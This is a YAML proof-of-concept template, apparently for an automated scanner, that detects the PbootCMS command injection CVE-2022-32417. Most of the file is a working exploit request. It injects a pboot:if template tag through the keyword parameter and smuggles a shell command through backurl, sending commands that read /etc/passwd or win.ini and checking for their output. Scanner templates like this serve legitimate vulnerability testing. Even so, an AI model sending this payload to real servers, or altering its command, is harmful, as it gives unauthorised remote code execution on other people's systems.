name: yaml-poc-pbootcms-pbootcms-command_injection-CVE-2022-32417
binding: dad61f65-0b63-439c-9cef-ac08c8f31967
detail:
    author: system_user
    links:
        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32417
        - https://cxsecurity.com/cveshow/CVE-2022-32417/
        - https://github.com/Snakinya/Vuln/issues/1
        - https://nvd.nist.gov/vuln/detail/CVE-2022-32417
    vulnerability:
        id: 434e7c28-5825-4a16-b0cf-169ec5ddacfc
        level: critical
    warning: Harmless
transport: http
payloads:
    payloads:
        linux:
            cmd: |
                "cat%20/etc/passwd"
            re: |
                "root:[x*]:0:0:"
        windows:
            cmd: |
                "type%20C:\\Windows\\win.ini"
            re: |
                "for 16-bit app support"
rules:
    r0:
        request:
            cache: false
            method: GET
            path: /index.php?keyword=}{pboot:if(get_lg/*&*/()/*&*/(get_backurl/*&*/()))}data{/pboot:if}&backurl=;{{cmd}}
            headers:
                Cookie: lg=system
        expression: response.status == 200 && re.bmatches(response.body)
expression: r0()
